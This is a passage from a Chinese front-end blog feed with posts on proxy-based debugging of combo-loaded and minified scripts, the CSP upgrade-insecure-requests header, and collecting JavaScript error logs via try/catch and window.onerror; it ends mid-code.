css。</p><p>不过我更希望有一个自己可以放开瞎捣鼓的地方。所以我选择 hexo&#x2F;jekyll&#x2F;wp，但是也希望别人来管理我的博客，所以选择了 github&#x2F;gitcafe。如果你想拥有一个个人网站，你可以这么做：</p><ol><li>注册一个 github 账户 abc</li><li>新建一个仓库 xxx</li><li>写一行代码 <code>This is my blog.</code> 到 <code>index.html</code>， 提交到 <code>gh-pages</code> 分支</li><li>预览 <code>http://abc.github.io/xxx</code>，你会发现，你的个人网站已经搞好了</li></ol><p>对于这种高效快捷的流程，加上 github 默认对 <code>jekyll</code> 的支持，让谁不想去尝试尝试呢？</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在线调试方案的思考与实践</title>
      <link href="/blog/2015/08/24/cb-debug-suggest/"/>
      <url>/blog/2015/08/24/cb-debug-suggest/</url>
      
        <content type="html"><![CDATA[<p>本文的要点不在移动端调试上，移动端调试无非就是调试页面和调试工具之间存在分离，消除这种分离并创建连结就能解决移动端的调试问题。重点阐述的是所见即所得的调试模式下会遇到的阻碍。</p><p>当我们打开网页，发现一个模块没有正确地渲染或者空白时，如果控制台有报错，会直接根据报错定位到源码位置开始 debug；如果控制台没有报错，则会根据模块名或者模块特征的一个值，通过全局搜索找到这个模块的位置，然后在调试工具中断点，单步调试，找到问题所在，此时我们可能会这样做：</p><p><strong>情形一：</strong></p><p>小A同学打开控制台，发现断点调试不好写代码，于是将压缩的源码复制一份保存到本地，格式化，然后将线上资源通过代理工具代理到本地文件。</p><p><strong>情形二：</strong></p><p>小B同学早早的为自己配了一份本地开发环境，于是他遇到问题之后，直接去源码中定位错误位置，由于使用的是预处理语言，所以需要先打包编译之后再在本地预览效果。</p><p><strong>情形三：</strong></p><p>小C同学的调试方式是小A和小B的综合版本，将线上的资源代理到本地 build 目录文件，在 src 目录下修改之后编译打包到 build，然后预览。</p><h3 id="_2"><a class="headeranchor-link" name="user-content-_2" href="#_2"></a>代理调试的烦恼</h3><p>而对于比较复杂的线上环境，代理也会遇到很多障碍，比如：</p><p><strong>线上资源 combo</strong></p><p>出现错误的脚本地址为 <code>http://example.com/path/??a.js,b.js,c.js</code>，它对应着 <code>a.js</code>,<code>b.js</code>,<code>c.js</code> 三个脚本文件，如果我们使用 Fiddler/Charles 这样的经典代理工具调试代码，就必须给这些工具编写插件，或者在替换配置里头加一堆判断或者正则，成本高，门槛高。</p><p><strong>线上代码压缩</strong></p><p>打包压缩，这是上线之前的必经流程。由于我们在打包的环节中并没有考虑为代码添加 sourceMap，而线上之前对应 <code>index-min.js</code> 的 <code>index.js</code> 也因为安全方面的原因给干掉了，这给我们调试代码造成了极大的不便利。</p><p><strong>代码依赖较多，拉取代码问题</strong></p><p>很多时候，我们的页面依赖了多个 asserts 资源，而这些资源各自分布在多个仓库之中，甚至分布在不同的发布平台上，为了能够在源码上清晰的调试代码，我们不得不将所有的资源下载到本地，期间一旦存在下载代码的权限问题，整个调试进度就慢下来，这是十分不能忍受的事情。比如某系统构建的页面，页面上的模块都是以仓库为维度区分的，一个页面可能对应了5-50个仓库，下载代码实为麻烦。</p><p>最可怕的调试是，本地没有对应的测试环境、代理工具又不满足我们的需求，然后就只能，<code>编辑代码-&gt;打包压缩-&gt;提交代码-&gt;查看效果-&gt;编辑代码-&gt;...</code>，如果你的项目开发是这种模式，请停下来，思考调试优化方案，正所谓磨刀不误砍柴工。</p><h3 id="_3"><a class="headeranchor-link" name="user-content-_3" href="#_3"></a>开启懒人调试模式</h3><p>当看到线上出现问题（可能是其他同学负责页面的问题），脑中浮出这样的场景：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">  我：&quot;嘿，线上有问题啦！我要调试代码！&quot;</span><br><span class="line">电脑：&quot;好的，主人。请问是哪个页面？&quot;（弹出浮层）</span><br><span class="line">  我：浮层中输入URL。</span><br><span class="line">电脑：&quot;请问是哪个地方出问题了？&quot;</span><br><span class="line">  我：（指着电脑）&quot;模块<span class="selector-tag">A</span>和模块<span class="selector-tag">B</span>。&quot;</span><br><span class="line">电脑：正在下载<span class="selector-tag">A</span>、<span class="selector-tag">B</span>资源...正在将上线<span class="selector-tag">A</span>、<span class="selector-tag">B</span>映射到本地...自动打开<span class="selector-tag">A</span>、<span class="selector-tag">B</span>对应文件夹</span><br><span class="line">  我：编辑代码，然后实时预览效果。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这里我们需要解决这样几个问题</p><ul><li>将页面对应的所有仓库/资源罗列在用户面前</li><li>下载资源的权限提示和权限处理</li><li>线上资源解 combo，然后映射到本地</li></ul><p>当然调试之后，可以还有一个操作：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"> 我：<span class="string">&quot;哈，已经修复了，帮我提交代码~&quot;</span></span><br><span class="line">电脑：正在diff代码<span class="string">...</span>收到确认提交信号，提交到预发环境<span class="string">...</span>收到已经预览信号<span class="string">...</span>正在发布代码<span class="string">...</span>收到线上回归信号<span class="string">...</span>流程结束</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了 debug 代码，我们需要做的就只是用眼睛看效果是否 ok，整个流程优化下来，体验是很赞的！</p><h3 id="_4"><a class="headeranchor-link" name="user-content-_4" href="#_4"></a>解决代理遇到的问题</h3><p>上面我们提到了三个问题，平时开发遇到最头疼的一个是 combo，曾经我们页面上的代码加一个 <code>?_xxx</code> 参数就能够直接开始调试模式，那是因为程序的入口只有一个，而且所有脚本的依赖也打包到一个叫做 <code>deps.js</code> 文件中，加上调试参数之后，可以将原来 combo 加载的文件: <code>http://example.com/path/??a-min.js,b-min.js,c-min.js</code>，按照非 combo 的方式加载：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/path/</span>a.js</span><br><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/path/</span>b.js</span><br><span class="line">http:<span class="regexp">//</span>example.com<span class="regexp">/path/</span>c.js</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码可以轻松地代理到本地，但是有的系统生成的代码并没有 <code>deps.js</code> 文件，它是将脚本直接输出到页面上：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/path/??a-min.js,b-min.js,c-min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>解决 combo 问题</strong></p><p>此时通过 Fiddler/Charles 工具比较难满足需求，对于这个问题有两个处理方案：</p><p><strong>1). 浏览器请求全部代理到本地的一个服务</strong></p><p>首先写一个本地服务：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = require(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="comment">// npm i http-proxy --save</span></span><br><span class="line"><span class="keyword">var</span> httpProxy = require(<span class="string">&#x27;http-proxy&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> proxy = httpProxy.createProxyServer(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(req.url);</span><br><span class="line">  <span class="keyword">if</span>(req.url.<span class="built_in">indexOf</span>(<span class="string">&quot;??&quot;</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="comment">// combo资源让 3400 端口的服务处理</span></span><br><span class="line">    proxy.web(req, res, &#123; <span class="attr">target</span>: <span class="string">&#x27;http://127.0.0.1:3400&#x27;</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 直接返回</span></span><br><span class="line">    proxy.web(req, res, &#123; <span class="attr">target</span>: req.url &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).listen(<span class="number">3399</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;在端口 3399 监听浏览器请求&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码的意思是，利用 http-proxy 这个 npm 包，代理浏览器的请求，浏览器上使用 switchSharp 设置本地代理为 <code>http://127.0.0.1:3399</code>，当请求过来，先判断 url，如果 url 中包含了 <code>??</code> 则将其作为 combo 资源处理，代理给本地的另一个服务 <code>http://127.0.0.1:3400</code>，这个服务收到请求后会将 combo 内容分解成多个，全部请求完之后再吐出来。</p><p><strong>2). 使用本地服务请求 html 代码，替换 html 代码内容</strong></p><p>使用强制手段（源码替换）将代码解 combo，比如源码页面为：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- html code --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/path/??a-min.js,b-min.js,c-min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- html code --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用本地服务请求这个url，然后转换成：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- html code --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/path/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/path/b.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/path/c.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- html code --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实现这个操作的代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = require(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="comment">// npm i request --save;</span></span><br><span class="line"><span class="keyword">var</span> request = require(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line">http.createServer(<span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> path = req.url.<span class="built_in">slice</span>(req.url.<span class="built_in">indexOf</span>(<span class="string">&quot;path=&quot;</span>) + <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(path);</span><br><span class="line">    <span class="keyword">if</span>(!path) &#123;</span><br><span class="line">        res.write(<span class="string">&quot;path is empty&quot;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    request(path, <span class="keyword">function</span> (<span class="params">error, response, body</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!error &amp;&amp; response.statusCode == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.<span class="built_in">log</span>(body);</span><br><span class="line">            <span class="comment">// 代码替换</span></span><br><span class="line">            body = body.<span class="built_in">replace</span>(<span class="string">&#x27;&lt;script src=&quot;https://example.com/path/??a-min.js,b-min.js,c-min.js&quot;&gt;&lt;/script&gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;&lt;script src=&quot;https://example.com/path/a.js&quot;&gt;&lt;/script&gt;\</span></span><br><span class="line"><span class="string">                &lt;script src=&quot;https://example.com/path/b.js&quot;&gt;&lt;/script&gt;\</span></span><br><span class="line"><span class="string">                &lt;script src=&quot;https://example.com/path/c.js&quot;&gt;&lt;/script&gt;&#x27;</span></span><br><span class="line">            );</span><br><span class="line">            res.write(body);</span><br><span class="line">            res.end();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).listen(<span class="number">3399</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;listening on port 3399&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比如请求 <code>http://127.0.0.1:3399/?path=http://www.taobao.com</code>，即可拿到淘宝首页的源码，然后对拿到的代码做替换。</p><p><strong>解决代码压缩问题</strong></p><p>对于这个问题，建议在线上放两份源码，一份是压缩源码，一份是未压缩源码，当页面 <code>url</code> 存在 <code>debug</code> 参数的时候，返回未压缩版本，正常返回压缩版本。当然，也可以采用上述方式处理问题。</p><p>不过，更合理的方式应该是 <code>sourceMap</code>，前端没有秘密，压缩代码只是增加了 hacker 的攻击成本，并不妨碍有能力的 hacker 借系统漏洞入侵。所以可以为源码提供一份 <a href="http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html">sourceMap 文件</a>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> sourcemaps = <span class="built_in">require</span>(<span class="string">&#x27;gulp-sourcemaps&#x27;</span>);</span><br><span class="line"></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;javascript&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  gulp.<span class="title function_">src</span>(<span class="string">&#x27;src/**/*.js&#x27;</span>)</span><br><span class="line">    .<span class="title function_">pipe</span>(sourcemaps.<span class="title function_">init</span>())</span><br><span class="line">      <span class="comment">//.pipe(xx())</span></span><br><span class="line">    .<span class="title function_">pipe</span>(sourcemaps.<span class="title function_">write</span>())</span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于 sourceMap 的 gulp 插件配置，详情可以<a href="//www.npmjs.com/package/gulp-sourcemaps">戳这里</a>。不仅仅是 JavaScript，CSS 也有 source maps，这个信息可以在 Chrome 控制台的设置选项中看到：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/242227387805954.png" alt=""></p><p><strong>代码的拉取</strong></p><p>如果一个项目只有你知道如何修改，那这个项目的技术设计就有点糟糕了，为了让众人都能处理你项目中的问题，一定要需要一个简洁的模式为开发者快速搭建测试环境，文档是一方面，如果有个一键操作的命令，那就更棒了！</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动脚本</span></span><br><span class="line"><span class="symbol">start:</span> createFile getMod getPage</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line"><span class="symbol">createFile:</span></span><br><span class="line">  <span class="meta">@[ -d module ]</span> || mkdir <span class="class"><span class="keyword">module</span></span></span><br><span class="line">  <span class="meta">@[ -d page ]</span> || mkdir page</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取模块仓库，这里有几十个，比较费时，请耐心等待...</span></span><br><span class="line"><span class="symbol">getMod:</span></span><br><span class="line">  cd <span class="class"><span class="keyword">module</span>;</span> \</span><br><span class="line">  <span class="keyword">for</span> i in <span class="variable">$(</span>MODS); <span class="keyword">do</span> \</span><br><span class="line">    [ -d <span class="variable">$(</span>MODPATH)<span class="variable">$$</span>i ] || git clone <span class="variable">$(</span>MODPATH)<span class="variable">$$</span>i; \</span><br><span class="line">    git co -b master;\</span><br><span class="line">    git co -b <span class="variable">$(</span>MODSV);</span><br><span class="line">  done</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取页面仓库，tbindex</span></span><br><span class="line"><span class="symbol">getPage:</span></span><br><span class="line">  cd page; \</span><br><span class="line">  <span class="meta">@[ -d tbindex ]</span> || git clone <span class="variable">$(</span>PAGEPATH)<span class="variable">$PAGE</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是一个 <code>MakeFile</code> 的部分代码，作用是创建开发目录，拉取分支信息，然后开始服务器，打开浏览器，使用 IDE 打开目录，万事就绪，只等主人敲代码。</p><p>整个流程就一两分钟，完成开发之前所有的准备工作。这个脚本不仅仅是给自己使用，如果其他人也需要参与开发，一个命令就能让参与者进入开发模式，加上文档说明，省却了很多沟通成本。</p><h3 id="_5"><a class="headeranchor-link" name="user-content-_5" href="#_5"></a>在线调试实践(一个系统的调试工具)</h3><p>输入需要调试的页面URL（如 <a href="http://www.taobao.com">http://www.taobao.com</a>）：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/242227502024677.png" alt=""></p><p>插件会分析 DOM，遍历拿到页面所有被引用到的仓库：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/242227584832841.png" alt=""></p><p>选择需要调试的模块（颗粒度细分到了html/js/css），点击调试按钮，可以看到调试页面的资源都会引用本地下载的文件。</p><h3 id="_6"><a class="headeranchor-link" name="user-content-_6" href="#_6"></a>小结</h3><p>优化流程、优化架构是我们矢志不渝坚持的方向，本文主要阐述，编辑代码到调试线上效果的过程，提出了解决 combo 和代码压缩等问题的方案和建议。希望可以给不擅长代理调试的同学一点启示。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让浏览器不再显示 https 页面中的 http 请求警报</title>
      <link href="/blog/2015/08/21/cb-upgrade-insecure-requests/"/>
      <url>/blog/2015/08/21/cb-upgrade-insecure-requests/</url>
      
        <content type="html"><![CDATA[<p>HTTPS 是 HTTP over Secure Socket Layer，以安全为目标的 HTTP 通道，所以在 HTTPS 承载的页面上不允许出现 http 请求，一旦出现就是提示或报错：</p><blockquote><p>Mixed Content: The page at "<a href="//www.taobao.com/">//www.taobao.com/</a>" was loaded over HTTPS, but requested an insecure image "<a href="http://g.alicdn.com/s.gif">http://g.alicdn.com/s.gif</a>". This content should also be served over HTTPS.</p></blockquote><p>HTTPS改造之后，我们可以在很多页面中看到如下警报：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/211107536449320.png" alt=""></p><p>很多运营对 https 没有技术概念，在填入的数据中不免出现 http 的资源，体系庞大，出现疏忽和漏洞也是不可避免的。</p><h3 id="cspupgrade-insecure-requests"><a class="headeranchor-link" name="user-content-cspupgrade-insecure-requests" href="#cspupgrade-insecure-requests"></a>CSP设置upgrade-insecure-requests</h3><p>好在 W3C 工作组考虑到了我们升级 HTTPS 的艰难，在 2015 年 4 月份就出了一个 <code>Upgrade Insecure Requests</code> 的<a href="http://www.w3.org/TR/mixed-content/">草案</a>，他的作用就是让浏览器自动升级请求。</p><p>在我们服务器的响应头中加入：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: upgrade-insecure-requests&quot;</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们的页面是 https 的，而这个页面中包含了大量的 http 资源（图片、iframe等），页面一旦发现存在上述响应头，会在加载 http 资源时自动替换成 https 请求。可以查看 google 提供的一个 <a href="//googlechrome.github.io/samples/csp-upgrade-insecure-requests/index.html">demo</a>：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/211108018005511.png" alt=""></p><p>不过让人不解的是，这个资源发出了两次请求，猜测是浏览器实现的 bug：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/211108089252988.png" alt=""></p><p>当然，如果我们不方便在服务器/Nginx 上操作，也可以在页面中加入 <code>meta</code> 头：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;upgrade-insecure-requests&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目前支持这个设置的还只有 chrome 43.0，不过我相信，CSP 将成为未来 web 前端安全大力关注和使用的内容。而 <code>upgrade-insecure-requests</code> 草案也会很快进入 RFC 模式。</p><p>从 W3C 工作组给出的 <a href="http://www.w3.org/TR/upgrade-insecure-requests/#examples">example</a>，可以看出，这个设置不会对外域的 a 链接做处理，所以可以放心使用。</p><h3 id="_1"><a class="headeranchor-link" name="user-content-_1" href="#_1"></a>相关阅读</h3><ul><li><a href="http://www.w3.org/TR/mixed-content/">http://www.w3.org/TR/mixed-content/</a></li><li><a href="//www.chromestatus.com/feature/6534575509471232">//www.chromestatus.com/feature/6534575509471232</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端代码异常日志收集与监控</title>
      <link href="/blog/2015/08/20/cb-fe-monitor/"/>
      <url>/blog/2015/08/20/cb-fe-monitor/</url>
      
        <content type="html"><![CDATA[<p>在复杂的网络环境和浏览器环境下，自测、QA测试以及 Code Review 都是不够的，如果对页面稳定性和准确性要求较高，就必须有一套完善的代码异常监控体系，本文从前端代码异常监控的方法和问题着手，尽量全面地阐述错误日志收集各个阶段中可能遇到的阻碍和处理方案。</p><h3 id="_2"><a class="headeranchor-link" name="user-content-_2" href="#_2"></a>收集日志的方法</h3><p>平时收集日志的手段，可以归类为两个方面，一个是逻辑中的错误判断，为主动判断；一个是利用语言给我们提供的捷径，暴力式获取错误信息，如 <code>try..catch</code> 和 <code>window.onerror</code>。</p><p><strong>1. 主动判断</strong></p><p>我们在一些运算之后，得到一个期望的结果，然而结果不是我们想要的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// code...</span></span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">calc</span>() !== <span class="string">&quot;someVal&quot;</span>)&#123;</span><br><span class="line">  Reporter.<span class="title function_ invoke__">send</span>(&#123;</span><br><span class="line">    <span class="attr">position</span>: <span class="string">&quot;test.js::&lt;function&gt;calc&quot;</span></span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;calc error&quot;</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></function><p>这种属于逻辑错误/状态错误的反馈，在接口 <code>status</code> 判断中用的比较多。</p><p><strong>2. <code>try..catch</code> 捕获</strong></p><p>判断一个代码段中存在的错误：</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="comment">// code...</span></span><br><span class="line">&#125; <span class="built_in">catch</span>(e)&#123;</span><br><span class="line">  Reporter<span class="selector-class">.send</span>(format(e));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以 <code>init</code> 为程序的入口，代码中所有同步执行出现的错误都会被捕获，这种方式也可以很好的避免程序刚跑起来就挂。</p><p><strong>3. <code>window.onerror</code></strong></p><p>捕获全局错误：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> errInfo = <span class="title function_">format</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="title class_">Reporter</span>.<span class="title function_">send</span>(errInfo);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面的函数中返回 <code>return true</code>，错误便不会暴露到控制台中。下面是它的参数信息：</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;String&#125;  errorMessage   错误信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;String&#125;  scriptURI      出错的文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;Long&#125;    lineNumber     出错代码的行号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;Long&#125;    columnNumber   出错代码的列号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;Object&#125;  errorObj       错误的详细信息，Anything</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">window</span>.<span class="property">onerror</span> <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">errorMessage</span>, <span class="params">scriptURI</span>, <span class="params">lineNumber</span>,<span class="params">columnNumber</span>,<span class="params">errorObj</span>) &#123;</span><br><span class="line">    <span class="comment">// code..</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>window.onerror</code> 算是一种特别暴力的容错手段，<code>try..catch</code> 也是如此，他们底层的实现就是利用 C/C++ 中的 <code>goto</code> 语句实现，一旦发现错误，不管目前的堆栈有多深，不管代码运行到了何处，直接跑到顶层或者 <code>try..catch</code> 捕获的那一层，这种一脚踢开错误的处理方式并不是很好。</p><h3 id="_3"><a class="headeranchor-link" name="user-content-_3" href="#_3"></a>收集日志存在的问题</h3><p>收集日志的目的是为了及时发现问题，最好日志能够告诉我们，错误在哪里，更优秀的做法是，不仅告诉错误在哪里，还告诉我们，如何处理这个错误。终极目标是，发现错误，自动容错，这一步是最难的。</p><h4 id="1-script-error"><a class="headeranchor-link" name="user-content-1-script-error" href="#1-script-error"></a>1. 无具体报错信息，Script error.</h4><p>先看下面的例子，test.html</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://barret/test.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://barret/test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test.js</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">// http://barret/test.js</span><br><span class="line"><span class="keyword">function</span> <span class="title">test</span>()&#123;</span><br><span class="line">  ver a = 1;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">a+1</span>;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们期望收集到的日志是下面这样具体的信息：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/200018292699298.png" alt=""></p><p>为了对资源进行更好的配置和管理，我们通常将静态资源放到异域上</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://barret/test.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://localhost/test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而拿到的结果却是：</p><p><img src="https://images0.cnblogs.com/blog2015/387325/201508/200018372534203.png" alt=""></p><p>翻开 Chromium 的 WebCore <a href="http://trac.webkit.org/browser/branches/chromium/1453/Source/WebCore/dom/ScriptExecutionContext.cpp#L293">源码</a>，可以看到：</p><p><a href="http://trac.webkit.org/browser/branches/chromium/1453/Source/WebCore/dom/ScriptExecutionContext.cpp#L293" target="_blank"><img src="https://images0.cnblogs.com/blog2015/387325/201508/200018447228952.png" alt=""></a></p><p>跨域情况下，返回的结果是 <code>Script error.</code>。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> http:<span class="regexp">//</span>trac.webkit.org<span class="regexp">/browser/</span>branches<span class="regexp">/chromium/</span><span class="number">1453</span><span class="regexp">/Source/</span>WebCore<span class="regexp">/dom/</span>ScriptExecutionContext.cpp<span class="comment">#L333</span></span><br><span class="line">String message = errorMessage;</span><br><span class="line">int line = lineNumber;</span><br><span class="line">String sourceName = sourceURL;</span><br><span class="line"><span class="regexp">//</span> 